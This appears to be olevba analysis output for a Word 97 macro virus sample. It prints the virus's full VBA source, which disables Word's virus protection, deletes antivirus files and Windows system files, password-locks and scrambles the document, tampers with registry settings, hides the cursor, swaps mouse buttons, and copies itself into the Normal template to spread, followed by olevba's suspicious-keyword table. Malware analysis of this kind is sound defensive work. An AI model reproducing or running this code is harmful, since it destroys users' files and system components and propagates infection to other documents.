olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.eb-fef6136d23dc070fa8d04c49bafa43cca5bc4585
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.eb-fef6136d23dc070fa8d04c49bafa43cca5bc4585 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Kz876.bas 
in file: Virus.MSWord.VMPCK1.eb-fef6136d23dc070fa8d04c49bafa43cca5bc4585 - OLE stream: 'Macros/VBA/Kz876'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer
Declare Function SwapMouseButton Lib "USER32" (ByVal bSwap As Long) As Long

Sub AutoOpen()

    ' Word97 Macro Virii Creation Kit
    ' ===============================
    ' Code by Jack Twoflower/LzØ Vx
    ' ===============================
    ' W97M.°°AFFENWALD°°

On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
.ScreenUpdating = False
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Application.VBE.ActiveVBProject.VBComponents("Kz876").Export "C:\Kz876.sys"
 'This code is taken from Pyro | Thanks
Set Current = MacroContainer
For Grow = 1 To 20
Number = Current.VBProject.VBComponents("Kz876").CodeModule.ProcCountLines("AutoOpen", vbext_pk_Proc)
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 40 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
Current.VBProject.VBComponents("Kz876").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
Remark = ""
Next Grow
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN\*.*")
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN95\*.*")
Kill ("C:\Programme\Norton Antivirus\V32scan.dll")
Kill ("C:\Programme\Norton Antivirus\Virscan.dat")
Kill ("C:\PROGRAMME\TBAV\TBAV.DAT")
Kill ("C:\TBAV\TBAV.DAT")
Kill ("C:\Programme\Dr Solomon's\Anti-Virus Toolkit\*.*")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, Password:="15h97g3s"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Virii Virus"
ActiveDocument.FollowHyperlink Address:="http://www.moritzlangner.de", NewWindow:=False, AddHistory:=True
Dim a As Variant
Dim b As Variant
Selection.WholeStory
a = Selection
For i = 1 To Len(a)
b = Mid$(a, i, 1)
c = Asc(Mid$(a, i, 1))
d = c + 29
If d > 199 Then c = 30
e$ = e$ + Chr(d)
Next i
Selection.WholeStory
Selection.Cut
WordBasic.Insert e$
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "Tja,so weit sind wir schon,aber du weißst ja NICHT,dass ich deine Internet-Provider-Daten via e-mail bekommen habe !!"
Assistant.Visible = True
With Assistant.NewBalloon
.Icon = msoIconAlert
.Text = "Guten Morgen !! Warum öffnest du den Virus ??"
.Heading = "W97MVCK[Jack Twoflower/LzØ Vx]"
.Animation = msoAnimationSearching
.Show
End With
Assistant.Visible = False
While ShowCursor(False) >= 0
Wend
SwapMouseButton &H2
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = "01"
Kill ("C:\WINDOWS\SYSTEM\*.*")
Set Pn905 = ActiveDocument.VBProject.VBComponents
Set Sy547 = NormalTemplate.VBProject.VBComponents
For y = 1 To Sy547.Count
If Sy547(y).Name = "Kz876" Then Lm445 = True
Next y
For y = 1 To Pn905.Count
If Pn905(y).Name = "Kz876" Then Vk485 = True
Next y
If Lm445 = True And Vk485 = True Then Exit Sub
If Lm445 = True And Vk485 <> True Then Pn905.Import "c:\Kz876.sys": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Lm445 <> True And Vk485 = True Then Sy547.Import "c:\Kz876.sys": NormalTemplate.Save
If Day(Now()) = 31 Then MsgBox "This virus was created with W97MVCK by Jack Twoflower"
End Sub
Sub ExtrasMakro()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub AnsichtCode()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub AnsichtVBCode()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub DateiDokVorlagen()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
Sub FormatFormatvorlage()
MsgBox "Nicht genug Arbeitsspeicher!", 48, "Microsoft Word"
Call AutoOpen
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.moritzlan|URL                                          |
|          |gner.de             |                                             |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |V32scan.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
